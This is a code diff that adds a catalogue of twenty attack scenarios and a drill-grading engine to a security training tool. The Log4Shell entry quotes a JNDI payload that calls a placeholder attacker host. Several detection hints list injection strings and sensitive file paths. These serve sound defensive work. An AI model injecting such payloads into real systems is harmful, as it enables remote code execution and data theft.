@@ -2508,3 +2508,2304 @@ def get_drill_engine() -> DrillEngine:
     if _engine_instance is None:
         _engine_instance = DrillEngine()
     return _engine_instance
+
+# ---------------------------------------------------------------------------
+# ADVANCED SCENARIO LIBRARY
+# ---------------------------------------------------------------------------
+
+
+
+logger = logging.getLogger(__name__)
+
+
+@dataclass
+class AttackScenario:
+    """A pre-built attack scenario definition for FAIL Engine drills."""
+
+    name: str
+    display_name: str
+    category: str
+    severity: str                          # critical / high / medium / low
+    mitre_technique_id: str                # e.g. T1190
+    mitre_technique_name: str
+    affected_components_pattern: str       # regex or glob-style pattern
+    description: str
+    detection_hints: List[str]
+    expected_response_time_minutes: int    # industry benchmark
+    cvss_base: float
+    cwe_id: str
+    remediation_steps: List[str]
+    tags: List[str] = field(default_factory=list)
+
+
+class ScenarioLibrary:
+    """Library of 20+ pre-built attack scenarios for FAIL Engine drills.
+
+    Each scenario encapsulates a real-world attack class with MITRE ATT&CK
+    mapping, affected-component patterns, detection hints, and industry-
+    benchmark response times so teams can measure themselves against peers.
+
+    Usage::
+
+        lib = ScenarioLibrary()
+        scenario = lib.get_scenario("log4shell")
+        web_scenarios = lib.list_scenarios(category="web")
+        critical_s = lib.random_scenario(min_severity="critical")
+    """
+
+    _SCENARIOS: List[AttackScenario] = [
+        AttackScenario(
+            name="log4shell",
+            display_name="Log4Shell (CVE-2021-44228)",
+            category="rce",
+            severity="critical",
+            mitre_technique_id="T1190",
+            mitre_technique_name="Exploit Public-Facing Application",
+            affected_components_pattern="*log4j*,*logging*,*java*",
+            description=(
+                "Remote code execution via JNDI lookup in Apache Log4j ≤2.14.1. "
+                "Attacker sends ${jndi:ldap://attacker.com/x} in any logged field."
+            ),
+            detection_hints=[
+                "JNDI lookup patterns in request headers/body (User-Agent, X-Forwarded-For)",
+                "Outbound LDAP/RMI connections from application servers",
+                "Unexpected DNS queries containing base64-encoded strings",
+                "Processes spawning from JVM with unusual parent-child chains",
+            ],
+            expected_response_time_minutes=30,
+            cvss_base=10.0,
+            cwe_id="CWE-917",
+            remediation_steps=[
+                "Upgrade Log4j to ≥2.17.1 (Java 8) or ≥2.12.4 (Java 7)",
+                "Set log4j2.formatMsgNoLookups=true as immediate mitigation",
+                "Block outbound LDAP/RMI at firewall egress rules",
+                "Scan all images for log4j JARs using Syft/Grype",
+            ],
+            tags=["jndi", "java", "log4j", "rce", "2021"],
+        ),
+        AttackScenario(
+            name="spring4shell",
+            display_name="Spring4Shell (CVE-2022-22965)",
+            category="rce",
+            severity="critical",
+            mitre_technique_id="T1190",
+            mitre_technique_name="Exploit Public-Facing Application",
+            affected_components_pattern="*spring*,*springframework*",
+            description=(
+                "RCE via data-binding in Spring MVC/WebFlux on JDK 9+ with Tomcat. "
+                "Attacker binds class.classLoader to modify logging configuration."
+            ),
+            detection_hints=[
+                "POST requests with class.module.classLoader parameters",
+                "Tomcat access logs written to webroot directory",
+                "New JSP files appearing in webapp directories",
+                "Spring application startup errors referencing classLoader",
+            ],
+            expected_response_time_minutes=45,
+            cvss_base=9.8,
+            cwe_id="CWE-94",
+            remediation_steps=[
+                "Upgrade Spring Framework to ≥5.3.18 or ≥5.2.20",
+                "Upgrade Spring Boot to ≥2.6.6 or ≥2.5.12",
+                "Add DataBinder disallowed fields for class.*",
+                "Restrict WAF rules for class.module parameters",
+            ],
+            tags=["spring", "java", "rce", "2022"],
+        ),
+        AttackScenario(
+            name="ssrf",
+            display_name="Server-Side Request Forgery (SSRF)",
+            category="web",
+            severity="high",
+            mitre_technique_id="T1090",
+            mitre_technique_name="Proxy",
+            affected_components_pattern="*api*,*proxy*,*fetch*,*webhook*",
+            description=(
+                "SSRF allows attackers to make the server issue requests to internal "
+                "resources. Often used to reach cloud metadata services (169.254.169.254) "
+                "or internal admin endpoints."
+            ),
+            detection_hints=[
+                "Requests to 169.254.169.254 or 100.100.100.200 (IMDS)",
+                "Outbound connections to RFC-1918 addresses from app servers",
+                "URL parameters containing http://localhost or http://internal",
+                "Unusual HTTP responses containing AWS credentials or GCP tokens",
+            ],
+            expected_response_time_minutes=60,
+            cvss_base=8.6,
+            cwe_id="CWE-918",
+            remediation_steps=[
+                "Validate and allowlist URL schemes and hosts before fetching",
+                "Block IMDS via AWS IMDSv2 enforcement (require-imds-v2=true)",
+                "Use egress firewall rules to block RFC-1918 from app servers",
+                "Implement DNS rebinding protection in HTTP clients",
+            ],
+            tags=["ssrf", "web", "cloud", "imds"],
+        ),
+        AttackScenario(
+            name="xxe",
+            display_name="XML External Entity Injection (XXE)",
+            category="web",
+            severity="high",
+            mitre_technique_id="T1059",
+            mitre_technique_name="Command and Scripting Interpreter",
+            affected_components_pattern="*xml*,*parser*,*soap*,*xslt*",
+            description=(
+                "XXE enables attackers to read arbitrary files or perform SSRF by "
+                "injecting external entity references into XML processed by the server."
+            ),
+            detection_hints=[
+                "XML payloads containing DOCTYPE declarations with SYSTEM keyword",
+                "File read attempts via file:// URI in XML entity",
+                "Outbound DNS queries matching ENTITY exfiltration patterns",
+                "XML parser exceptions referencing external resource loading",
+            ],
+            expected_response_time_minutes=90,
+            cvss_base=7.5,
+            cwe_id="CWE-611",
+            remediation_steps=[
+                "Disable external entity processing in all XML parsers",
+                "Use defusedxml library for Python, or equivalent safe parsers",
+                "Apply input validation to reject DOCTYPE declarations",
+                "Enable WAF rules for XXE attack signatures",
+            ],
+            tags=["xxe", "xml", "web"],
+        ),
+        AttackScenario(
+            name="sqli",
+            display_name="SQL Injection (SQLi)",
+            category="injection",
+            severity="critical",
+            mitre_technique_id="T1190",
+            mitre_technique_name="Exploit Public-Facing Application",
+            affected_components_pattern="*db*,*database*,*query*,*dao*,*repository*",
+            description=(
+                "SQL injection occurs when unsanitized user input is embedded directly "
+                "into SQL queries, allowing attackers to read, modify, or delete data."
+            ),
+            detection_hints=[
+                "SQL error messages in HTTP responses (ORA-, MySQL error, etc.)",
+                "Unusual query patterns in DB slow-query logs",
+                "Requests containing SQL keywords: UNION SELECT, OR 1=1, --",
+                "Spikes in DB error rate correlated with specific endpoints",
+            ],
+            expected_response_time_minutes=45,
+            cvss_base=9.8,
+            cwe_id="CWE-89",
+            remediation_steps=[
+                "Use parameterized queries / prepared statements exclusively",
+                "Apply ORM query builders instead of string concatenation",
+                "Implement WAF with SQLi rule set (OWASP CRS)",
+                "Scan code with SAST tools (Semgrep SQLi rules)",
+            ],
+            tags=["sqli", "injection", "database"],
+        ),
+        AttackScenario(
+            name="rce",
+            display_name="Remote Code Execution (Generic RCE)",
+            category="rce",
+            severity="critical",
+            mitre_technique_id="T1059",
+            mitre_technique_name="Command and Scripting Interpreter",
+            affected_components_pattern="*exec*,*shell*,*subprocess*,*command*",
+            description=(
+                "Generic RCE via unsafe use of eval(), exec(), subprocess without "
+                "input validation. Allows attacker to execute arbitrary OS commands."
+            ),
+            detection_hints=[
+                "Unexpected process spawns from web server process (e.g., apache → bash)",
+                "Shell commands in application logs (ls, cat, curl, wget)",
+                "Outbound connections from application to external IP on unusual ports",
+                "File system modifications in non-expected paths",
+            ],
+            expected_response_time_minutes=30,
+            cvss_base=9.8,
+            cwe_id="CWE-78",
+            remediation_steps=[
+                "Replace eval()/exec() with safe alternatives or whitelisted operations",
+                "Use subprocess.run with shell=False and argument lists",
+                "Apply AppArmor/seccomp profiles to restrict syscalls",
+                "Deploy runtime application self-protection (RASP)",
+            ],
+            tags=["rce", "exec", "shell"],
+        ),
+        AttackScenario(
+            name="path_traversal",
+            display_name="Path Traversal / Directory Traversal",
+            category="web",
+            severity="high",
+            mitre_technique_id="T1083",
+            mitre_technique_name="File and Directory Discovery",
+            affected_components_pattern="*file*,*upload*,*download*,*static*",
+            description=(
+                "Path traversal allows reading files outside the intended directory "
+                "by using ../ sequences to escape the document root."
+            ),
+            detection_hints=[
+                "URL or parameter values containing ../ or %2e%2e%2f",
+                "Requests for /etc/passwd, /etc/shadow, or Windows system files",
+                "File read errors mentioning unexpected paths in application logs",
+                "Spike in 403/404 errors from a single source IP",
+            ],
+            expected_response_time_minutes=60,
+            cvss_base=7.5,
+            cwe_id="CWE-22",
+            remediation_steps=[
+                "Canonicalize file paths and verify they start with allowed base path",
+                "Use os.path.realpath() and compare to allowed root",
+                "Reject filenames containing .. at input validation layer",
+                "Apply Chroot or containerization to limit filesystem access",
+            ],
+            tags=["path-traversal", "file", "web"],
+        ),
+        AttackScenario(
+            name="idor",
+            display_name="Insecure Direct Object Reference (IDOR)",
+            category="web",
+            severity="high",
+            mitre_technique_id="T1530",
+            mitre_technique_name="Data from Cloud Storage",
+            affected_components_pattern="*api*,*resource*,*object*,*record*",
+            description=(
+                "IDOR occurs when an application exposes internal object IDs "
+                "(user IDs, order IDs) without verifying the requester owns the resource."
+            ),
+            detection_hints=[
+                "Sequential or predictable IDs in API responses (1001, 1002, 1003)",
+                "User accessing resources belonging to another user_id",
+                "Authorization errors not correlated with actual access denials",
+                "Unusual patterns of ID enumeration from a single session",
+            ],
+            expected_response_time_minutes=120,
+            cvss_base=6.5,
+            cwe_id="CWE-639",
+            remediation_steps=[
+                "Implement object-level authorization checks (not just endpoint auth)",
+                "Use UUIDs instead of sequential integer IDs for resources",
+                "Add authorization middleware that verifies ownership on every request",
+                "Log and alert on cross-user resource access attempts",
+            ],
+            tags=["idor", "authorization", "api"],
+        ),
+        AttackScenario(
+            name="jwt_bypass",
+            display_name="JWT Algorithm Confusion / None Algorithm",
+            category="auth",
+            severity="critical",
+            mitre_technique_id="T1550",
+            mitre_technique_name="Use Alternate Authentication Material",
+            affected_components_pattern="*auth*,*jwt*,*token*,*identity*",
+            description=(
+                "JWT none-algorithm attack: attacker sets alg=none in the header, "
+                "removing signature verification. Or exploits RS256→HS256 confusion."
+            ),
+            detection_hints=[
+                "JWTs with alg=none in base64-decoded headers",
+                "Authentication tokens with mismatched algorithm claims",
+                "Successful auth with tokens failing signature verification",
+                "Requests with manually crafted JWT payloads (elevated roles)",
+            ],
+            expected_response_time_minutes=30,
+            cvss_base=9.1,
+            cwe_id="CWE-327",
+            remediation_steps=[
+                "Explicitly allowlist accepted JWT algorithms (reject alg=none)",
+                "Use a robust JWT library (PyJWT with algorithms param)",
+                "Rotate signing keys and invalidate existing tokens",
+                "Implement token binding and short expiry (≤15 minutes)",
+            ],
+            tags=["jwt", "auth", "token"],
+        ),
+        AttackScenario(
+            name="api_key_leak",
+            display_name="API Key / Secret Exposure",
+            category="secrets",
+            severity="critical",
+            mitre_technique_id="T1552",
+            mitre_technique_name="Unsecured Credentials",
+            affected_components_pattern="*config*,*env*,*secret*,*credential*,*key*",
+            description=(
+                "API keys, OAuth secrets, or database passwords committed to source "
+                "control, exposed in logs, or present in container images."
+            ),
+            detection_hints=[
+                "Secrets-scanning alerts from git pre-commit hooks or Gitleaks",
+                "AWS/GCP API key patterns (AKIA...) in code repositories",
+                "Secrets in environment variables printed to application logs",
+                "Container image layers containing .env files with credentials",
+            ],
+            expected_response_time_minutes=15,
+            cvss_base=9.0,
+            cwe_id="CWE-798",
+            remediation_steps=[
+                "Rotate all exposed secrets immediately",
+                "Move secrets to vault (HashiCorp Vault, AWS Secrets Manager)",
+                "Add pre-commit hooks with detect-secrets or Gitleaks",
+                "Audit git history and scrub using git-filter-repo",
+            ],
+            tags=["secrets", "credentials", "api-key"],
+        ),
+        AttackScenario(
+            name="s3_bucket_exposure",
+            display_name="S3 Bucket Public Exposure",
+            category="cloud",
+            severity="high",
+            mitre_technique_id="T1530",
+            mitre_technique_name="Data from Cloud Storage",
+            affected_components_pattern="*s3*,*storage*,*bucket*,*blob*",
+            description=(
+                "S3 buckets configured with public read/write ACLs, exposing "
+                "sensitive data including PII, credentials, or internal documents."
+            ),
+            detection_hints=[
+                "AWS Config rule s3-bucket-public-read-prohibited triggered",
+                "CloudTrail events showing GetBucketAcl returning PUBLIC_READ",
+                "Unusual GetObject requests from unauthenticated principals",
+                "S3 access logs showing requests from unknown external IPs",
+            ],
+            expected_response_time_minutes=30,
+            cvss_base=8.1,
+            cwe_id="CWE-284",
+            remediation_steps=[
+                "Enable S3 Block Public Access at account and bucket level",
+                "Audit bucket ACLs and bucket policies for public access",
+                "Enable S3 server-side encryption (SSE-KMS)",
+                "Configure AWS Config rules for continuous monitoring",
+            ],
+            tags=["s3", "cloud", "aws", "storage"],
+        ),
+        AttackScenario(
+            name="k8s_escape",
+            display_name="Kubernetes Container Escape",
+            category="container",
+            severity="critical",
+            mitre_technique_id="T1611",
+            mitre_technique_name="Escape to Host",
+            affected_components_pattern="*k8s*,*kubernetes*,*pod*,*container*",
+            description=(
+                "Container escape via privileged pods, hostPath mounts, or kernel "
+                "exploits to gain access to the underlying Kubernetes node."
+            ),
+            detection_hints=[
+                "Pod running with privileged: true security context",
+                "hostPath volume mounts referencing /etc or /var/run/docker.sock",
+                "Container accessing /proc/1/root or /host filesystem",
+                "Unexpected kernel module loading from container process",
+            ],
+            expected_response_time_minutes=20,
+            cvss_base=8.8,
+            cwe_id="CWE-269",
+            remediation_steps=[
+                "Remove privileged: true from all pod specs",
+                "Apply PodSecurity admission controller (restricted profile)",
+                "Remove hostPath mounts and use PVCs instead",
+                "Enable Falco runtime security for container escape detection",
+            ],
+            tags=["kubernetes", "container", "escape", "cloud-native"],
+        ),
+        AttackScenario(
+            name="supply_chain",
+            display_name="Supply Chain Attack (Compromised Dependency)",
+            category="supply-chain",
+            severity="critical",
+            mitre_technique_id="T1195",
+            mitre_technique_name="Supply Chain Compromise",
+            affected_components_pattern="*package*,*dependency*,*npm*,*pip*,*maven*",
+            description=(
+                "Attacker compromises an upstream dependency (npm, PyPI, Maven) "
+                "with malicious code that executes at install time or runtime."
+            ),
+            detection_hints=[
+                "New package version with postinstall scripts not in previous versions",
+                "Dependency hash mismatch vs pinned lockfile values",
+                "Unexpected outbound connections from CI/CD pipeline",
+                "Package maintainer account takeover alerts from registry",
+            ],
+            expected_response_time_minutes=60,
+            cvss_base=9.8,
+            cwe_id="CWE-506",
+            remediation_steps=[
+                "Pin all dependencies to exact versions with hash verification",
+                "Use Sigstore/cosign to verify package signatures",
+                "Enable Dependabot or Renovate with SBOM generation",
+                "Restrict CI/CD egress to known package registries only",
+            ],
+            tags=["supply-chain", "dependencies", "package-manager"],
+        ),
+        AttackScenario(
+            name="dependency_confusion",
+            display_name="Dependency Confusion Attack",
+            category="supply-chain",
+            severity="high",
+            mitre_technique_id="T1195",
+            mitre_technique_name="Supply Chain Compromise",
+            affected_components_pattern="*package*,*registry*,*internal*,*private*",
+            description=(
+                "Attacker publishes a public package with the same name as an internal "
+                "private package but a higher version number, causing package managers "
+                "to prefer the malicious public version."
+            ),
+            detection_hints=[
+                "Package manager resolving internal package names from public registry",
+                "New public packages matching internal package naming conventions",
+                "Unexpected network calls during pip/npm install in CI",
+                "Package hashes not matching internal registry checksums",
+            ],
+            expected_response_time_minutes=90,
+            cvss_base=8.6,
+            cwe_id="CWE-506",
+            remediation_steps=[
+                "Configure package manager to always prefer internal registry",
+                "Use namespace scoping for internal packages (@company/pkg)",
+                "Enable dependency confusion detection in Nexus/Artifactory",
+                "Monitor public registries for packages matching internal names",
+            ],
+            tags=["dependency-confusion", "supply-chain", "package-manager"],
+        ),
+        AttackScenario(
+            name="prototype_pollution",
+            display_name="Prototype Pollution (JavaScript)",
+            category="injection",
+            severity="high",
+            mitre_technique_id="T1059",
+            mitre_technique_name="Command and Scripting Interpreter",
+            affected_components_pattern="*node*,*javascript*,*js*,*frontend*",
+            description=(
+                "Attacker modifies Object.prototype via __proto__ or constructor "
+                "properties, causing unexpected behavior in all objects."
+            ),
+            detection_hints=[
+                "Request payloads containing __proto__ or constructor.prototype keys",
+                "Object property checks returning unexpected truthy values",
+                "Node.js process receiving unexpected global property changes",
+                "CSP violations from unexpected code paths being triggered",
+            ],
+            expected_response_time_minutes=120,
+            cvss_base=7.4,
+            cwe_id="CWE-1321",
+            remediation_steps=[
+                "Use Object.create(null) for data containers",
+                "Validate and sanitize all user-supplied object keys",
+                "Apply npm audit fix for affected lodash/merge libraries",
+                "Use eslint-plugin-security to detect prototype pollution patterns",
+            ],
+            tags=["prototype-pollution", "javascript", "nodejs"],
+        ),
+        AttackScenario(
+            name="deserialization",
+            display_name="Insecure Deserialization",
+            category="injection",
+            severity="critical",
+            mitre_technique_id="T1059",
+            mitre_technique_name="Command and Scripting Interpreter",
+            affected_components_pattern="*serial*,*pickle*,*marshal*,*yaml*,*java*",
+            description=(
+                "Untrusted data deserialized without validation allows attackers "
+                "to execute arbitrary code (pickle, Java serialization, PHP unserialize)."
+            ),
+            detection_hints=[
+                "Python pickle.loads() on untrusted data in application code",
+                "Java ObjectInputStream reading from network without class filtering",
+                "yaml.load() without Loader=SafeLoader in Python apps",
+                "Unusual Java class loading patterns after deserialization events",
+            ],
+            expected_response_time_minutes=45,
+            cvss_base=9.8,
+            cwe_id="CWE-502",
+            remediation_steps=[
+                "Replace pickle with JSON or MessagePack for serialization",
+                "Use yaml.safe_load() instead of yaml.load()",
+                "For Java: implement ObjectInputFilter class allowlisting",
+                "Isolate deserialization in sandboxed processes",
+            ],
+            tags=["deserialization", "pickle", "java", "rce"],
+        ),
+        AttackScenario(
+            name="ldap_injection",
+            display_name="LDAP Injection",
+            category="injection",
+            severity="high",
+            mitre_technique_id="T1059",
+            mitre_technique_name="Command and Scripting Interpreter",
+            affected_components_pattern="*ldap*,*directory*,*auth*,*ad*",
+            description=(
+                "LDAP injection manipulates LDAP queries through unsanitized input, "
+                "allowing authentication bypass or unauthorized directory access."
+            ),
+            detection_hints=[
+                "LDAP queries containing special characters: )(|&*",
+                "Authentication bypass using *(|(uid=*))(uid=*) patterns",
+                "Excessive directory query volume from single IP",
+                "LDAP error messages leaking directory structure in responses",
+            ],
+            expected_response_time_minutes=90,
+            cvss_base=7.5,
+            cwe_id="CWE-90",
+            remediation_steps=[
+                "Escape LDAP special characters in all query parameters",
+                "Use parameterized LDAP query builders",
+                "Apply input validation to reject LDAP metacharacters",
+                "Restrict LDAP query scope to minimum required OU",
+            ],
+            tags=["ldap", "injection", "directory"],
+        ),
+        AttackScenario(
+            name="command_injection",
+            display_name="OS Command Injection",
+            category="injection",
+            severity="critical",
+            mitre_technique_id="T1059",
+            mitre_technique_name="Command and Scripting Interpreter",
+            affected_components_pattern="*shell*,*exec*,*command*,*run*,*system*",
+            description=(
+                "Attacker injects OS commands through unsanitized parameters passed "
+                "to shell commands, achieving arbitrary command execution."
+            ),
+            detection_hints=[
+                "Request parameters containing |, ;, &&, || or backtick characters",
+                "Unexpected child process spawning from web application user",
+                "Process tree showing web server spawning shell processes",
+                "OS command output appearing in HTTP responses",
+            ],
+            expected_response_time_minutes=20,
+            cvss_base=9.8,
+            cwe_id="CWE-77",
+            remediation_steps=[
+                "Use subprocess.run with shell=False and argument list (never string)",
+                "Validate inputs against allowlist before passing to system calls",
+                "Remove unnecessary shell command invocations from application code",
+                "Apply AppArmor profile to restrict process spawning",
+            ],
+            tags=["command-injection", "rce", "shell"],
+        ),
+        AttackScenario(
+            name="buffer_overflow",
+            display_name="Buffer Overflow / Memory Corruption",
+            category="memory",
+            severity="critical",
+            mitre_technique_id="T1203",
+            mitre_technique_name="Exploitation for Client Execution",
+            affected_components_pattern="*native*,*c*,*cpp*,*binary*,*ffi*",
+            description=(
+                "Buffer overflow in native code (C/C++) allows attackers to corrupt "
+                "memory and achieve code execution by overwriting return addresses."
+            ),
+            detection_hints=[
+                "Memory sanitizer alerts (AddressSanitizer, Valgrind) in test results",
+                "Segmentation faults or access violation exceptions in production",
+                "Unusual memory usage spikes followed by process crashes",
+                "Stack canary violations reported by OS or compiler",
+            ],
+            expected_response_time_minutes=60,
+            cvss_base=9.0,
+            cwe_id="CWE-120",
+            remediation_steps=[
+                "Enable compiler protections: -fstack-protector-all, -D_FORTIFY_SOURCE=2",
+                "Use bounds-checked string functions (strncpy, strlcpy)",
+                "Apply ASLR and NX/DEP system-wide",
+                "Fuzz the affected binary with AFL++ or libFuzzer",
+            ],
+            tags=["buffer-overflow", "memory", "native", "c"],
+        ),
+        AttackScenario(
+            name="race_condition",
+            display_name="Race Condition / TOCTOU",
+            category="concurrency",
+            severity="high",
+            mitre_technique_id="T1548",
+            mitre_technique_name="Abuse Elevation Control Mechanism",
+            affected_components_pattern="*shared*,*resource*,*lock*,*transaction*",
+            description=(
+                "Time-of-check to time-of-use (TOCTOU) vulnerabilities allow "
+                "attackers to exploit the window between a security check and resource use."
+            ),
+            detection_hints=[
+                "File operations between stat() and open() calls",
+                "Database operations outside transactions on shared resources",
+                "Concurrent requests causing inconsistent state in counters/balances",
+                "Test failures that occur intermittently under load",
+            ],
+            expected_response_time_minutes=120,
+            cvss_base=7.0,
+            cwe_id="CWE-362",
+            remediation_steps=[
+                "Use atomic file operations (O_EXCL flag, rename-to-target pattern)",
+                "Wrap shared resource access in database transactions with SELECT FOR UPDATE",
+                "Apply optimistic locking with version fields for concurrent updates",
+                "Use threading.Lock() or asyncio.Lock() for in-process shared state",
+            ],
+            tags=["race-condition", "toctou", "concurrency"],
+        ),
+    ]
+
+    # Severity ordering for comparison
+    _SEVERITY_ORDER = {"critical": 4, "high": 3, "medium": 2, "low": 1}
+
+    def __init__(self) -> None:
+        self._by_name: Dict[str, AttackScenario] = {s.name: s for s in self._SCENARIOS}
+        self._by_category: Dict[str, List[AttackScenario]] = {}
+        for s in self._SCENARIOS:
+            self._by_category.setdefault(s.category, []).append(s)
+
+    # ------------------------------------------------------------------
+    # Public API
+    # ------------------------------------------------------------------
+
+    def get_scenario(self, name: str) -> AttackScenario:
+        """Return a scenario by slug name.
+
+        Args:
+            name: Scenario slug (e.g. "log4shell", "sqli").
+
+        Raises:
+            KeyError: If scenario name is not found in the library.
+        """
+        if name not in self._by_name:
+            available = ", ".join(sorted(self._by_name.keys()))
+            raise KeyError(
+                f"Scenario '{name}' not found. Available: {available}"
+            )
+        return self._by_name[name]
+
+    def list_scenarios(
+        self,
+        category: Optional[str] = None,
+        min_severity: Optional[str] = None,
+        tags: Optional[List[str]] = None,
+    ) -> List[AttackScenario]:
+        """List scenarios, optionally filtered by category/severity/tags.
+
+        Args:
+            category: Filter by category (e.g. "web", "injection", "rce").
+            min_severity: Minimum severity level to include.
+            tags: Only return scenarios that have ALL provided tags.
+
+        Returns:
+            Sorted list of matching AttackScenario objects.
+        """
+        results = list(self._SCENARIOS)
+
+        if category:
+            results = [s for s in results if s.category == category]
+
+        if min_severity:
+            min_rank = self._SEVERITY_ORDER.get(min_severity.lower(), 0)
+            results = [
+                s for s in results
+                if self._SEVERITY_ORDER.get(s.severity, 0) >= min_rank
+            ]
+
+        if tags:
+            tag_set = set(t.lower() for t in tags)
+            results = [
+                s for s in results
+                if tag_set.issubset(set(t.lower() for t in s.tags))
+            ]
+
+        # Sort: severity desc, then name asc
+        results.sort(
+            key=lambda s: (-self._SEVERITY_ORDER.get(s.severity, 0), s.name)
+        )
+        return results
+
+    def random_scenario(
+        self,
+        min_severity: str = "low",
+        category: Optional[str] = None,
+        exclude_names: Optional[List[str]] = None,
+    ) -> AttackScenario:
+        """Return a random scenario meeting the given criteria.
+
+        Args:
+            min_severity: Minimum severity level for the random pick.
+            category: Optional category filter.
+            exclude_names: Scenario names to exclude (avoid repeats).
+
+        Raises:
+            ValueError: If no scenarios match the criteria.
+        """
+        candidates = self.list_scenarios(
+            category=category, min_severity=min_severity
+        )
+        if exclude_names:
+            exc = set(exclude_names)
+            candidates = [s for s in candidates if s.name not in exc]
+        if not candidates:
+            raise ValueError(
+                f"No scenarios match min_severity='{min_severity}', "
+                f"category='{category}', excludes={exclude_names}"
+            )
+        return random.choice(candidates)
+
+    def all_names(self) -> List[str]:
+        """Return sorted list of all scenario names."""
+        return sorted(self._by_name.keys())
+
+    def all_categories(self) -> List[str]:
+        """Return sorted list of all distinct categories."""
+        return sorted(self._by_category.keys())
+
+    def to_dict(self) -> Dict[str, Any]:
+        """Serialize the full library to a dict (for API responses)."""
+        return {
+            "total_scenarios": len(self._SCENARIOS),
+            "categories": self.all_categories(),
+            "scenarios": [
+                {
+                    "name": s.name,
+                    "display_name": s.display_name,
+                    "category": s.category,
+                    "severity": s.severity,
+                    "mitre_technique_id": s.mitre_technique_id,
+                    "mitre_technique_name": s.mitre_technique_name,
+                    "cvss_base": s.cvss_base,
+                    "cwe_id": s.cwe_id,
+                    "expected_response_time_minutes": s.expected_response_time_minutes,
+                    "tags": s.tags,
+                }
+                for s in self._SCENARIOS
+            ],
+        }
+
+
+# ---------------------------------------------------------------------------
+# AUTOMATED GRADING ENGINE
+# ---------------------------------------------------------------------------
+
+
+@dataclass
+class GradingDimension:
+    """A single graded dimension with score, rubric details, and benchmark."""
+
+    name: str
+    score: float                  # 0.0 – 10.0
+    benchmark: float              # Industry benchmark score
+    delta_vs_benchmark: float     # score - benchmark
+    grade_letter: str             # A+ / A / B / C / D / F
+    rubric_details: str
+    recommendations: List[str] = field(default_factory=list)
+
+
+@dataclass
+class DrillGradingReport:
+    """Full grading report for a completed drill."""
+
+    drill_id: str
+    org_id: str
+    scenario_name: str
+    component: str
+    graded_at: str
+
+    # Six dimensions
+    detection_speed: GradingDimension
+    triage_accuracy: GradingDimension
+    remediation_speed: GradingDimension
+    communication: GradingDimension
+    documentation_quality: GradingDimension
+    post_incident_review: GradingDimension
+
+    # Aggregates
+    overall_score: float
+    overall_grade: str
+    percentile_estimate: float       # Estimated percentile vs industry
+    summary: str
+    strengths: List[str]
+    improvement_areas: List[str]
+    next_drill_suggestions: List[str]
+
+
+class AutoGrader:
+    """Automated drill grading engine with 6-dimension rubric.
+
+    Grades a completed FAIL Engine drill across:
+    1. Detection Speed     — How quickly the synthetic finding was noticed
+    2. Triage Accuracy     — Correct severity/classification vs expected
+    3. Remediation Speed   — Time from triage to confirmed fix
+    4. Communication       — Team notification and escalation quality
+    5. Documentation       — Quality of notes, comments, and run-book updates
+    6. Post-Incident Review — PIR completeness (root cause, lessons learned)
+
+    Industry benchmarks represent median performance across Fortune-500
+    security teams (sourced from SANS SOC Survey 2024).
+
+    Usage::
+
+        grader = AutoGrader()
+        report = grader.grade_drill(drill_record)
+        print(report.overall_grade)
+    """
+
+    # Industry benchmarks per dimension (0–10)
+    INDUSTRY_BENCHMARKS: Dict[str, float] = {
+        "detection_speed": 6.2,
+        "triage_accuracy": 7.1,
+        "remediation_speed": 5.8,
+        "communication": 6.5,
+        "documentation_quality": 5.2,
+        "post_incident_review": 4.8,
+    }
+
+    # Dimension weights (must sum to 1.0)
+    DIMENSION_WEIGHTS: Dict[str, float] = {
+        "detection_speed": 0.22,
+        "triage_accuracy": 0.20,
+        "remediation_speed": 0.22,
+        "communication": 0.14,
+        "documentation_quality": 0.12,
+        "post_incident_review": 0.10,
+    }
+
+    # SLA targets per severity (minutes)
+    _DETECTION_SLA: Dict[str, int] = {
+        "critical": 15,
+        "high": 30,
+        "medium": 60,
+        "low": 120,
+    }
+    _TRIAGE_SLA: Dict[str, int] = {
+        "critical": 10,
+        "high": 20,
+        "medium": 45,
+        "low": 90,
+    }
+    _REMEDIATION_SLA: Dict[str, int] = {
+        "critical": 120,
+        "high": 360,
+        "medium": 720,
+        "low": 1440,
+    }
+
+    def __init__(self) -> None:
+        self._scenario_library = ScenarioLibrary()
+
+    # ------------------------------------------------------------------
+    # Public API
+    # ------------------------------------------------------------------
+
+    def grade_drill(self, drill: Any) -> DrillGradingReport:
+        """Auto-grade a drill record and return a detailed report.
+
+        Args:
+            drill: A Drill dataclass instance from DrillEngine.
+
+        Returns:
+            DrillGradingReport with all 6 dimensions scored.
+        """
+        tl = drill.timeline
+        severity = drill.severity.value if hasattr(drill.severity, "value") else str(drill.severity)
+
+        # --- Compute raw time deltas ---
+        detection_minutes = self._minutes_between(tl.injected_at, tl.detected_at)
+        triage_minutes = self._minutes_between(tl.detected_at, tl.triaged_at)
+        remediation_minutes = self._minutes_between(tl.injected_at, tl.remediated_at)
+
+        # --- Grade each dimension ---
+        detection_dim = self._grade_detection_speed(
+            detection_minutes, severity
+        )
+        triage_dim = self._grade_triage_accuracy(
+            drill, triage_minutes, severity
+        )
+        remediation_dim = self._grade_remediation_speed(
+            remediation_minutes, severity
+        )
+        communication_dim = self._grade_communication(drill)
+        documentation_dim = self._grade_documentation_quality(drill)
+        pir_dim = self._grade_post_incident_review(drill)
+
+        # --- Compute weighted overall ---
+        dims = {
+            "detection_speed": detection_dim,
+            "triage_accuracy": triage_dim,
+            "remediation_speed": remediation_dim,
+            "communication": communication_dim,
+            "documentation_quality": documentation_dim,
+            "post_incident_review": pir_dim,
+        }
+        overall = sum(
+            dims[k].score * self.DIMENSION_WEIGHTS[k]
+            for k in self.DIMENSION_WEIGHTS
+        )
+        overall_grade = self._score_to_letter(overall)
+        percentile = self._estimate_percentile(overall)
+
+        # --- Build summary text ---
+        strengths, improvements = self._extract_strengths_improvements(dims)
+        summary = self._build_summary(overall, overall_grade, dims, severity)
+        next_suggestions = self._suggest_next_drills(dims, drill.scenario_name)
+
+        return DrillGradingReport(
+            drill_id=drill.drill_id,
+            org_id=drill.org_id,
+            scenario_name=drill.scenario_name,
+            component=drill.target_component,
+            graded_at=datetime.now(timezone.utc).isoformat(),
+            detection_speed=detection_dim,
+            triage_accuracy=triage_dim,
+            remediation_speed=remediation_dim,
+            communication=communication_dim,
+            documentation_quality=documentation_dim,
+            post_incident_review=pir_dim,
+            overall_score=round(overall, 2),
+            overall_grade=overall_grade,
+            percentile_estimate=round(percentile, 1),
+            summary=summary,
+            strengths=strengths,
+            improvement_areas=improvements,
+            next_drill_suggestions=next_suggestions,
+        )
+
+    def generate_report(self, drill: Any) -> Dict[str, Any]:
+        """Generate a JSON-serializable detailed drill report.
+
